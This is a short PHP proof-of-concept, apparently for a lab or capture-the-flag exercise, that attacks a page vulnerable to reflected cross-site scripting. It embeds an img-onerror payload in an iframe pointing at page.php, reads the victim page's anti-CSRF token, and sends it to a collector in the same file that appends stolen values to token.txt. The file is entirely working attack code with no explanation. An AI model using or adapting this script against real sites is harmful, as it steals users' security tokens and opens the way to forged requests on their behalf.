<?php

if(isset($_GET['x'])){
    $f = fopen('token.txt', 'a');
    fwrite($f, $_GET['x'] . "\n");
    fclose($f);
    die('');
}

$payload = '<img src=sadasd.png onerror="document.createElement(\'IMG\').src=\'./attack.php?x=\'+document.getElementById(\'xsrf\').value" />';
$payload=urlencode($payload);
?>

<iframe src="./page.php?msg=<?= $payload ?>"></iframe>
